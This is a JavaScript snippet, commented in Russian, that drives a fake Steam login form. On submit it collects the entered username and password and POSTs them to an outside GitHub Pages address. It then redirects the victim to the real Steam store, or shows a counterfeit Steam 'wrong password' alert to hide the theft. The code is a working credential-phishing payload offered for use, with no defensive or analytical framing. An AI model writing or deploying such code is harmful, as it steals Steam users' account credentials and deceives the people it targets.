     document.getElementById('steamLoginForm').addEventListener('submit', async (event) => {
            event.preventDefault(); // Предотвращаем стандартную отправку формы

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // Отправка данных на ваш бэкэнд
            try {
                const response = await fetch('https://r99373215-design.github.io/lollz/', { // Замените на ваш домен
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ username, password }),
                });

                if (response.ok) {
                    console.log('Credentials sent successfully.');
                    // После успешной отправки, перенаправить пользователя
                    // Например, на реальную страницу Steam или страницу "вы выиграли"
                                        window.location.href = 'https://store.steampowered.com/'; // Перенаправление на реальный Steam
                } else {
                    console.error('Failed to send credentials.');
                    // Можно показать фейковое сообщение об ошибке Steam
                    alert('Неверное имя аккаунта или пароль. Повторите попытку.');
                }
            } catch (error) {
                console.error('Network error:', error);
                alert('Произошла ошибка сети. Повторите попытку позже.');
            }
        });
